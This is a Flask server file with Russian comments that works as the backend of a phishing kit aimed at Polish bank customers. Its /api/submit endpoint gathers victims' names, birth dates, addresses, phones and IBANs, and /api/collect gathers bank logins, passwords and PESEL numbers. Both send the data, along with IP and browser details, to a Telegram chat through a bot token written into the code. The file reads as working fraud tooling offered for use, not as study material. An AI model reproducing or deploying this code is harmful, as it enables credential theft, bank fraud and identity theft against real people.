# ============================================================
#   app.py — Flask сервер для приёма данных и отправки в Telegram
#   Деплой: Render → gunicorn app:app
# ============================================================

from flask import Flask, request, jsonify, send_file, send_from_directory
from flask_cors import CORS
import requests
import os
import re
import time

app = Flask(__name__)
CORS(app)

# ============================================================
#   КОНФИГ
# ============================================================
TELEGRAM_BOT_TOKEN = os.environ.get(
    'TELEGRAM_TOKEN',
    '8403131166:AAEjVV93BhQBfFcJ_8rud46BwWC3omtKXY8'
)
TELEGRAM_CHAT_ID = os.environ.get(
    'TELEGRAM_CHAT',
    '-5485289736'
)

# ============================================================
#   УТИЛИТЫ
# ============================================================

def get_client_ip():
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    if request.headers.get('X-Real-IP'):
        return request.headers.get('X-Real-IP')
    return request.remote_addr or 'unknown'


def get_user_agent():
    return request.headers.get('User-Agent', 'unknown')


def parse_user_agent(ua):
    if not ua or ua == 'unknown':
        return {'browser': 'unknown', 'os': 'unknown', 'device': 'unknown', 'full': ua}

    r = {'browser': 'unknown', 'os': 'unknown', 'device': 'desktop', 'full': ua}
    u = ua.lower()

    if 'edg' in u:
        r['browser'] = 'Edge'
    elif 'opr' in u or 'opera' in u:
        r['browser'] = 'Opera'
    elif 'chrome' in u:
        r['browser'] = 'Chrome'
    elif 'firefox' in u:
        r['browser'] = 'Firefox'
    elif 'safari' in u:
        r['browser'] = 'Safari'
    elif 'brave' in u:
        r['browser'] = 'Brave'

    if 'windows nt 10' in u:
        r['os'] = 'Windows 10/11'
    elif 'windows nt 6.1' in u:
        r['os'] = 'Windows 7'
    elif 'windows' in u:
        r['os'] = 'Windows'
    elif 'android' in u:
        r['os'] = 'Android'
        r['device'] = 'mobile'
    elif 'iphone' in u or 'ipad' in u or 'ipod' in u:
        r['os'] = 'iOS'
        r['device'] = 'mobile'
    elif 'mac os x' in u or 'macintosh' in u:
        r['os'] = 'macOS'
    elif 'linux' in u:
        r['os'] = 'Linux'

    if 'tablet' in u or 'ipad' in u:
        r['device'] = 'tablet'
    elif 'mobile' in u:
        r['device'] = 'mobile'

    return r


def validate_polish_iban(raw):
    """Возвращает (valid, cleaned_26, bank_name)."""
    if not raw:
        return False, '', None

    cleaned = re.sub(r'[\s\-]', '', raw).upper()
    if cleaned.startswith('PL'):
        cleaned = cleaned[2:]
    cleaned = re.sub(r'\D', '', cleaned)

    if len(cleaned) != 26:
        return False, cleaned, None

    full = 'PL' + cleaned
    rearranged = full[4:] + full[:4]
    numeric = ''.join(str(ord(c) - 55) if c.isalpha() else c for c in rearranged)
    try:
        if int(numeric) % 97 != 1:
            return False, cleaned, None
    except ValueError:
        return False, cleaned, None

    bank_codes = {
        '1010': 'Narodowy Bank Polski',
        '1020': 'PKO Bank Polski',
        '1030': 'Citibank Handlowy',
        '1050': 'ING Bank Śląski',
        '1090': 'Santander Bank Polska',
        '1140': 'mBank',
        '1160': 'Bank Millennium',
        '1220': 'Bank Pekao',
        '1240': 'BNP Paribas Bank Polska',
        '1320': 'Bank Pocztowy',
        '1470': 'Alior Bank',
        '1540': 'Bank Ochrony Środowiska',
        '1600': 'BNP Paribas Bank Polska',
        '1670': 'Santander Consumer Bank',
        '1680': 'Plus Bank',
        '1870': 'Nest Bank',
        '1910': 'Deutsche Bank Polska',
        '1940': 'Credit Agricole Bank Polska',
        '2130': 'Bank Handlowy',
        '2160': 'BPS',
        '2490': 'Alior Bank',
    }
    sort_code = cleaned[0:4]
    bank_name = bank_codes.get(sort_code, 'Nieznany bank')

    return True, cleaned, bank_name


def send_telegram(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    try:
        r = requests.post(url, data={
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }, timeout=10)
        if r.status_code == 200:
            return True, None
        return False, f'HTTP {r.status_code}: {r.text[:200]}'
    except Exception as e:
        return False, str(e)


# ============================================================
#   СТАТИКА
# ============================================================

@app.route('/')
def index():
    return send_file('index.html')


@app.route('/site')
def site():
    return send_file('index.html')


@app.route('/static/<path:filename>')
def static_files(filename):
    return send_from_directory('static', filename)


@app.route('/<path:filename>')
def root_files(filename):
    return send_from_directory('.', filename)


@app.route('/health')
def health():
    return jsonify({
        'status': 'running',
        'timestamp': time.time()
    })


@app.route('/ping')
def ping():
    return jsonify({'status': 'alive', 'timestamp': time.time()})


# ============================================================
#   API — ФОРМА
# ============================================================

@app.route('/api/submit', methods=['POST'])
def submit_form():
    try:
        data = request.get_json(silent=True) or {}
        ip = get_client_ip()
        ua_string = get_user_agent()
        ua = parse_user_agent(ua_string)

        iban_raw = data.get('iban', '')
        valid, cleaned, bank = validate_polish_iban(iban_raw)
        formatted = ' '.join(cleaned[i:i+4] for i in range(0, len(cleaned), 4)) if cleaned else iban_raw
        if formatted and not formatted.startswith('PL'):
            formatted = 'PL' + formatted

        message = (
            '<b>NOWE DANE FORMULARZA</b>\n\n'
            f"<b>Imię:</b> {data.get('fullname', '—')}\n"
            f"<b>Data urodzenia:</b> {data.get('birthdate', '—')}\n"
            f"<b>Telefon:</b> {data.get('phone', '—')}\n"
            f"<b>Ulica:</b> {data.get('street', '—')}\n"
            f"<b>Miasto:</b> {data.get('city', '—')}\n"
            f"<b>Kod:</b> {data.get('postal', '—')}\n\n"
            f"<b>IBAN:</b> {formatted}\n"
            f"<b>Bank:</b> {bank or '—'}\n"
            f"<b>Status:</b> {'POPRAWNY' if valid else 'NIEPOPRAWNY'}\n\n"
            f"<b>IP:</b> {ip}\n"
            f"<b>Browser:</b> {ua['browser']} ({ua['os']}) — {ua['device']}\n"
            f"<b>UA:</b> {ua_string}"
        )

        ok, err = send_telegram(message)
        if ok:
            return jsonify({'success': True, 'ip': ip})
        return jsonify({'success': False, 'error': err}), 500
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ============================================================
#   API — БАНКИ
# ============================================================

@app.route('/api/collect', methods=['POST'])
def collect_bank():
    try:
        data = request.get_json(silent=True) or {}
        ip = get_client_ip()
        ua_string = get_user_agent()
        ua = parse_user_agent(ua_string)

        bank = data.get('bank', '—')
        login = data.get('username') or data.get('login') or '—'
        password = data.get('password', '—')
        pesel = data.get('pesel')

        message = (
            '<b>NOWE LOGOWANIE BANKOWE</b>\n\n'
            f"<b>Bank:</b> {bank}\n"
            f"<b>Login:</b> {login}\n"
            f"<b>Hasło:</b> {password}\n"
        )
        if pesel:
            message += f"<b>PESEL:</b> {pesel}\n"

        message += (
            f"\n<b>IP:</b> {ip}\n"
            f"<b>Browser:</b> {ua['browser']} ({ua['os']}) — {ua['device']}\n"
            f"<b>UA:</b> {ua_string}"
        )

        ok, err = send_telegram(message)
        if ok:
            return jsonify({'success': True, 'ip': ip})
        return jsonify({'success': False, 'error': err}), 500
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ============================================================
#   API — IBAN
# ============================================================

@app.route('/api/validate', methods=['POST'])
def validate_iban():
    try:
        data = request.get_json(silent=True) or {}
        iban = data.get('iban', '')
        valid, cleaned, bank = validate_polish_iban(iban)
        formatted = ' '.join(cleaned[i:i+4] for i in range(0, len(cleaned), 4)) if cleaned else ''
        if formatted and not formatted.startswith('PL'):
            formatted = 'PL' + formatted
        return jsonify({
            'success': valid,
            'iban': cleaned,
            'formatted': formatted,
            'bank': bank,
            'valid': valid
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.errorhandler(404)
def not_found(_):
    return jsonify({'error': 'Not found'}), 404


# ============================================================
#   ЗАПУСК
# ============================================================
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
